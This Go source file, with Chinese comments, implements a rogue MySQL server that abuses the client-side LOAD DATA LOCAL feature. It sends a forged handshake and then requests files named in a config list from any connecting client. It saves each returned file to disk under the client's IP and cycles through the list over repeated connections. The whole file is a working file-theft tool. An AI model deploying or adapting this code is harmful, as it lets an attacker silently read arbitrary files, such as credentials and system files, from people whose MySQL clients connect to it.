package mysql

import (
"bufio"
"bytes"
"encoding/binary"
"flag"
"fmt"
"log"
"net"
"os"
"strconv"
"syscall"
)

//读取文件时每次读取的字节数
const bufLength = 1024

//服务器第一个数据包的数据，可以根据格式自定义，这里要注意SSL字段要置0
var GreetingData = []byte{
	0x4a, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x35, 0x2e, 0x35, 0x33,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x75, 0x51, 0x73, 0x6f, 0x54, 0x36,
	0x50, 0x70, 0x00, 0xff, 0xf7, 0x21, 0x02, 0x00, 0x0f, 0x80, 0x15,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64,
	0x26, 0x2b, 0x47, 0x62, 0x39, 0x35, 0x3c, 0x6c, 0x30, 0x45, 0x4a,
	0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e, 0x61, 0x74, 0x69,
	0x76, 0x65, 0x5f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64,
	0x00,
}
//服务器第二个数据包认证成功的OK响应
var OkData = []byte{0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00}
//配置文件，用于保存要读取的文件列表，默认当前目录下的mysql.ini，可自定义
var configFile = ""
//保存要读取的文件列表
var fileNames []string
//记录每个客户端连接的次数
var recordClient = make(map[string]int)

func Start() {
	fmt.Println("mysql启动...")
	conf := flag.String("conf", "mysql.ini", "准备读取的客户端文件全路径，一行一个")
	flag.Parse()
	configFile = *conf
	fileNames = readConfig()
	listener := initMysqlServer("127.0.0.1:3308")
	for {
		conn, err := listener.Accept()
		handleError(err, "Accept: ")
		ip := getIp(conn)
		//由于文件最后保存的文件名包含ip地址，为了本地测试加了这个
		if ip == "::1" {
			ip = "localhost"
		}
		//这里记录每个客户端连接的次数，实现获取多个文件
		_, ok := recordClient[ip]
		if ok {
			if recordClient[ip] < len(fileNames)-1 {
				recordClient[ip] += 1
			}
		} else {
			recordClient[ip] = 0
		}
		go connectionClientHandler(conn)
	}
}

//初始化服务器
func initMysqlServer(hostAndPort string) net.Listener {
	serverAddr, err := net.ResolveTCPAddr("tcp", hostAndPort)
	handleError(err, "Resolving address:port failed: '"+hostAndPort+"'")
	listener, err := net.ListenTCP("tcp", serverAddr)
	handleError(err, "ListenTCP: ")
	log.Println("Listening to: ", listener.Addr().String())
	return listener
}

func connectionClientHandler(conn net.Conn) {
	defer conn.Close()
	connFrom := conn.RemoteAddr().String()
	log.Println("Connection from: ", connFrom)
	var ibuf = make([]byte, bufLength)
	//第一个包
	_, err := conn.Write(GreetingData)
	handleError(err, "Send one")
	//第二个包
	_, err = conn.Read(ibuf[0 : bufLength-1])
	handleError(err, "Read two")
	//判断是否有Can Use LOAD DATA LOCAL标志，如果有才支持读取文件
	if (uint8(ibuf[4]) & uint8(128)) == 0 {
		_ = conn.Close()
		log.Println("The client not support LOAD DATA LOCAL")
		return
	}
	//第三个包
	_, err = conn.Write(OkData)
	handleError(err, "Send three")
	//第四个包
	_, err = conn.Read(ibuf[0 : bufLength-1])
	handleError(err, "Read four")
	//这里根据客户端连接的次数来选择读取文件列表里面的第几个文件
	ip := getIp(conn)
	getFileData := []byte{byte(len(fileNames[recordClient[ip]]) + 1), 0x00, 0x00, 0x01, 0xfb}
	getFileData = append(getFileData, fileNames[recordClient[ip]]...)
	//第五个包
	_, err = conn.Write(getFileData)
	handleError(err, "Send five")
	getRequestContent(conn)
}

//获取客户端传来的文件数据
func getRequestContent(conn net.Conn) {
	var content bytes.Buffer
	//先读取数据包长度，前面3字节
	lengthBuf := make([]byte, 3)
	_, err := conn.Read(lengthBuf)
	handleError(err, "Read data length")
	totalDataLength := int(binary.LittleEndian.Uint32(append(lengthBuf, 0)))
	if totalDataLength == 0 {
		log.Println("Get no file and closed connection.")
		return
	}
	//然后丢掉1字节的序列号
	_, _ = conn.Read(make([]byte, 1))
	ibuf := make([]byte, bufLength)
	totalReadLength := 0
	//循环读取知道读取的长度达到包长度
	for {
		length, err := conn.Read(ibuf)
		switch err {
		case nil:
			log.Println("Get file and reading...")
			//如果本次读取的内容长度+之前读取的内容长度大于文件内容总长度，则本次读取的文件内容只能留下一部分
			if length+totalReadLength > totalDataLength {
				length = totalDataLength - totalReadLength
			}
			content.Write(ibuf[0:length])
			totalReadLength += length
			if totalReadLength == totalDataLength {
				//读取完成保存到本地文件
				saveContent(conn, content)
				//随便写点数据给客户端
				_, _ = conn.Write(OkData)
			}
		case syscall.EAGAIN: // try again
			continue
		default:
			log.Println("Closed connection: ", conn.RemoteAddr().String())
			return
		}
	}
}

//保存文件
func saveContent(conn net.Conn, content bytes.Buffer) {
	ip := getIp(conn)
	fmt.Println("保存文件中.....",strconv.Itoa(recordClient[ip]) + ".txt")
	saveName := ip + "-" + strconv.Itoa(recordClient[ip]) + ".txt"
	outputFile, outputError := os.OpenFile(saveName, os.O_WRONLY|os.O_CREATE, 0666)
	handleError(outputError, "Save content")
	defer outputFile.Close()
	outputWriter := bufio.NewWriter(outputFile)
	_, writeErr := outputWriter.WriteString(content.String())
	handleError(writeErr, "Write file")
	_ = outputWriter.Flush()
	return
}

//获取当前ip
func getIp(conn net.Conn) string {
	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	return ip
}

//处理错误
func handleError(error error, info string) {
	if error != nil {
		log.Printf(info + " error:" + error.Error() + "\n")
	}
}

//读取文件列表
func readConfig() []string {
	var line []string
	fileHandle, error := os.OpenFile(configFile, os.O_RDONLY, 0)
	handleError(error, "Open config file")
	defer fileHandle.Close()
	sc := bufio.NewScanner(fileHandle)
	/*default split the file use '\n'*/
	for sc.Scan() {
		line = append(line, sc.Text())
	}
	handleError(sc.Err(), "Read config file")
	return line
}